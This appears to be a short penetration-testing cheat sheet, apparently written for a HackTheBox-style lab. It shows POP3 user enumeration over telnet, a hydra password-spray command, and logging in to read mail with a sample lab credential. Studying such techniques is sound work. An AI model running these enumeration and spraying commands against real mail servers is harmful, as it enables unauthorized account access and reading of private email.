-- -
### User Enum
```bash
# connect to POP3 service
telenet <ip> 110

# USER
# Check if a user exists on the service.
# +OK means the user exists
# -ERR means the user does not exist
USER julio
```
### Password Spray
```bash
# Even though this is via a protocol for email, you do not need the user list to have emails like test@domain.com.
# you can make the user list like any other with names like john or frost or whatever. 
hydra -L <userlst> -p '<passwd>' -f <ip> pop3
```
### Interact w/ service
```bash
# connect
telnet <ip> 110

# authenticate
USER <user@domain>
PASS <passwd>

USER marlin@inlanefreight.htb
PASS poohbear

# List Messages
# output may be weird, but each message is numbered starting with 1
LIST

# retrieve specific message based on above output ID
RETR 1 # to view to first message
```